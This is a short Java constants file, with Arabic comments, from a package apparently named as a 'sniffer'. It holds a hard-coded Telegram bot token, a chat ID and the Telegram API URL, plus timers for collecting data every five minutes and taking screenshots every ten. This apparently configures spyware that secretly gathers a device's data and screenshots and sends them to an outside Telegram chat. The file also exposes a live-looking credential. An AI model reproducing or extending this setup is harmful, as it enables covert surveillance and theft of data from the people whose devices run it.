package com.v8.global.sniffer.utils;

public class Constants {
    // 🔐 توكن البوت - غير هذا برجاءاً
    public static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    public static final String CHAT_ID = "7259620384";
    public static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN + "/";
    
    // فترات الجمع
    public static final long COLLECT_INTERVAL = 5 * 60 * 1000; // 5 دقائق
    public static final long SCREENSHOT_INTERVAL = 10 * 60 * 1000; // 10 دقائق
}
